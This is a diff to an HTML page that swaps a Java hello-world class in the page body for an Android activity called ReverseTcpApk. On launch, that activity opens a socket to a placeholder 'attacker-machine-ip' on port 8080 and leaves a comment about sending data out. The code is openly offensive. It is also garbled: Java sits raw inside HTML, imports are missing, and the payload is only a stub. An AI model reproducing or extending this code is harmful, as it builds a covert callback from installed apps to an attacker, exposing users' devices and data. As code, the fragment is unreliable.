@@ -7,10 +7,54 @@
   </head>
   <body>
     <h2>hello</h2>
-public class HelloWorld {
-    public static void main(String[] args) {
-        System.out.println("Hello from Java on Kali Linux!");
-    }
+import android.os.Bundle;
+
+import android.util.Log;
+
+
+
+public class ReverseTcpApk extends AppCompatActivity {
+
+private static final String TAG = "ReverseTcpApk";
+
+
+
+@Override
+
+protected void onCreate(Bundle savedInstanceState) {
+
+super.onCreate(savedInstanceState);
+
+setContentView(R.layout.activity_main);
+
+
+
+// Establish reverse TCP connection
+
+new Thread(new Runnable() {
+
+public void run() {
+
+try {
+
+Socket socket = new Socket("attacker-machine-ip", 8080);
+
+Log.d(TAG, "Connected to attacker machine!");
+
+// Send data over the socket...
+
+} catch (IOException e) {
+
+Log.e(TAG, "Error establishing connection: " + e.getMessage());
+
+}
+
+}
+
+}).start();
+
+}
+
 }
 
   </body>
